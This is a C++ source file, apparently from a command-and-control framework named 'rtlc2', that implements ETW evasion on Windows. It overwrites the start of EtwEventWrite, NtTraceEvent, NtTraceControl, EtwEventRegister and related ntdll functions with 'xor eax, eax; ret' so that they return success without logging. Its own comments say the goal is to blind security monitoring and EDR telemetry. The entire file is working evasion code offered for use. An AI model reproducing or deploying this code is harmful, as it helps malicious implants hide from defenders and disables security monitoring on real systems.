// ETW (Event Tracing for Windows) Evasion - Windows only
// Patches ETW functions to blind security monitoring and EDR telemetry
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>

namespace rtlc2 {
namespace evasion {

// Helper: patch function to return 0 (STATUS_SUCCESS)
static bool PatchToReturnZero(HMODULE hModule, const char* funcName) {
    if (!hModule) return false;
    FARPROC pFunc = GetProcAddress(hModule, funcName);
    if (!pFunc) return false;

    unsigned char* addr = (unsigned char*)pFunc;

    // Already patched?
    if ((addr[0] == 0x33 || addr[0] == 0x31) && addr[1] == 0xC0 && addr[2] == 0xC3)
        return true;

    // xor eax, eax; ret
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };

    DWORD oldProtect = 0;
    if (!VirtualProtect(addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;

    memcpy(addr, patch, sizeof(patch));

    DWORD tmp = 0;
    VirtualProtect(addr, sizeof(patch), oldProtect, &tmp);
    return true;
}

// Technique 1: Patch EtwEventWrite - primary ETW event writing function
bool PatchEtwEventWrite() {
    return PatchToReturnZero(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
}

// Technique 2: Patch NtTraceEvent - syscall-level ETW function
bool PatchNtTraceEvent() {
    return PatchToReturnZero(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
}

// Technique 3: Patch NtTraceControl - prevents new trace sessions
bool PatchNtTraceControl() {
    return PatchToReturnZero(GetModuleHandleA("ntdll.dll"), "NtTraceControl");
}

// Technique 4: Disable ETW Threat Intelligence provider
// Patches EtwEventRegister to silently succeed without registering
bool DisableETWTI() {
    return PatchToReturnZero(GetModuleHandleA("ntdll.dll"), "EtwEventRegister");
}

// Master function - apply all ETW evasion techniques
bool DisableETW() {
    bool ok = PatchEtwEventWrite();

    // Best effort on secondary patches
    PatchNtTraceEvent();
    PatchNtTraceControl();
    PatchToReturnZero(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull");
    PatchToReturnZero(GetModuleHandleA("ntdll.dll"), "EtwEventWriteEx");
    DisableETWTI();

    return ok;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
